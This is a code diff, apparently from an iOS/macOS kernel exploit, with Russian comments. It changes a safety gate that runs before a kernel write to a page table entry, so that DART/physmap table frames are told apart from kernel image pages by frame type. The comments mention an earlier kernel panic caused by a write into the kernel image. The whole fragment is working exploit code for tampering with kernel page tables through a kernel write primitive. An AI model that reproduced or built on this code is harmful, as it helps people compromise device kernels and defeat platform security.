@@ -7016,16 +7016,22 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             // 1.9.190: ФИНАЛЬНЫЙ ГЕЙТ перед kwrite (урок паники 23:02 — ложный
             // матч повёл запись в kernel image): (1) pteVA вне kernel image,
             // (2) текущее PA-поле == backingPA ТОЧНО, (3) фрейм не deadly.
+            // 1.9.191: inImage НЕ считается для табличных фреймов {8,9,13} —
+            // physmap лежит близко к image и DART-таблица попала в окно 96MB
+            // (ложный ГЕЙТ ОТКАЗ на настоящем PTE типа 0x9). У image-страниц
+            // тип НЕ табличный — тип фрейма и есть точный дискриминатор.
             uint64_t kbase190 = kconstant(base);
-            BOOL inImage = (pteVA >= kbase190 && pteVA < kbase190 + 0x6000000ULL);
+            uint64_t ptePA190 = kvtophys(pteVA);
+            int ftype190 = ptePA190 ? kpFrameTypeOf(ptePA190) : -1;
+            BOOL tblFrame = (ftype190 == 0x8 || ftype190 == 0x9 || ftype190 == 0x13);
+            BOOL inImage = (pteVA >= kbase190 && pteVA < kbase190 + 0x6000000ULL) && !tblFrame;
             BOOL exactPA = ((origPTE & ptePAMask) == (backingPA & ptePAMask)) &&
                            ((origPTE & 0x0000FFFFFFFFF000ULL) == backingPA ||
                             (origPTE & 0x000003FFFFFFC000ULL) == backingPA);
-            uint64_t ptePA190 = kvtophys(pteVA);
             BOOL deadly = ptePA190 && kpFrameDeadly(ptePA190);
             if (inImage || !exactPA || deadly) {
-                kpNote(r, [NSString stringWithFormat:@"  [P2] ГЕЙТ ОТКАЗ: inImage=%d exactPA=%d deadly=%d — ЗАПИСЬ ОТМЕНЕНА (pteVA=%#llx origPTE=%#018llx)",
-                          inImage, exactPA, deadly, (unsigned long long)pteVA, (unsigned long long)origPTE]);
+                kpNote(r, [NSString stringWithFormat:@"  [P2] ГЕЙТ ОТКАЗ: inImage=%d exactPA=%d deadly=%d ftype=%#x — ЗАПИСЬ ОТМЕНЕНА (pteVA=%#llx origPTE=%#018llx)",
+                          inImage, exactPA, deadly, ftype190, (unsigned long long)pteVA, (unsigned long long)origPTE]);
                 pteVA = 0;
             }
         }
